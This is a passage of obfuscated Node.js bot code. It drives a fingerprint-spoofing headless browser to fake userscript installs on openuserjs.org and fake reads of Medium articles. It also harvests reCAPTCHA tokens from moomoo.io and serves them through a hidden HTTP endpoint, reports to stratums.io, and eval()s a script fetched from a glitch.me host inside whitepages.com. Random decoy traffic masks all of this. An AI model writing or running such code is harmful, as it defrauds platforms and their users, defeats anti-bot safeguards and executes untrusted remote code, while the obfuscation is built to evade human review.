      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    a0(0x4) + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + a1(0x11, 'mb3P') + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x2c8 + -0x1a5c + 0x1d24
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x38b + 0x13d * -0x13 + 0x13fc)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1168 + -0x9 * -0x303 + -0x94f), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x515 * -0x1 + 0x1a80 + -0x5 * 0x63d), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x45a * 0x8 + 0x1d4e + 0x200f * -0x2;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x201f + -0xf8c + 0x2fab; w < getRandomInt(0x2 * 0xe3e + 0x17d1 + -0x344c, -0x11b6 + 0x136 * -0x3 + -0x71f * -0x3); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x18bf3 + -0x7 * 0xda9 + 0x16af9 * 0x2);
        }
      }();
    }, 0xcce * 0x2 + 0x229 * 0x3 + 0xa91 * -0x3), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x8c * 0x43 + -0x1ff0 + -0x4b4;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1 * -0x19c9 + 0x229b + -0x1 * 0x8d2, -0x20e9 * -0x1 + 0x1be3 + -0x3c9a)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x4778 * -0x1 + -0x4f14 + 0x7ccc);
    }, 0xba9 + -0x77e + -0x3c7), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x454 * -0x6 + 0x1d57 + -0x35f;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1 * 0x1037 + 0x11bb + -0x2 * -0x51a), await u['evaluate'](() => {
            const a2 = c;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x862 + -0x2ca + 0xb2c), v[a2(0x2)](), eval(v['responseTe' + 'xt']);
          }), await wait(0xb7404 + 0x7 * 0x1283f + 0x1 * -0x5d21d);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x108f + -0x189b + 0x48 * 0x1e);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x196a + 0x1644 + 0x3ee);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0xd * 0x363 + 0x3819 + -0x4490);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x703 * -0x5 + 0x964 * 0x1 + 0x19ac) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x259e + 0x2e6 + 0x22b9));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x9 * -0x41b + 0x2321 + -0x4814, D['indexOf']('\x20'));
        return B ? E['slice'](0xb21 + 0xc + -0x1 * 0xb2d, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0xb * -0x18e + -0x59 * -0x2 + -0x1544 * -0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x32b8 + -0x1ef * 0xb + 0x99d),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + a3(0x6, 'i(zV') + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x52e + -0x1 * -0x1ab4 + -0x9a * 0x35; k < -0x231f + 0xad1 + 0x1852; k++)
    setTimeout(f, (-0x8e38 + -0x1119f + 0xf3 * 0x2ad) * k * getRandomInt(-0x1 * -0x1df5 + 0x1 * -0xcc8 + -0x112c, -0x52 * 0x23 + -0x1dbe + 0x28f7));
  setInterval(() => {
    f();
    for (let l = -0x1 * -0x204d + -0x2a1 + -0x1dac; l < -0x1ebe + -0x8ee + 0x13d8 * 0x2; l++)
      setTimeout(f, (-0x3d7 + 0x2f07 + 0xbf30) * l * getRandomInt(0xb6f + 0x1 * 0x1002 + -0x1b70, -0x6a * -0x2c + -0x7d * -0x31 + -0x2 * 0x1511));
  }, -0x2e3b55 + 0x64b2a6 + 0x772f);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
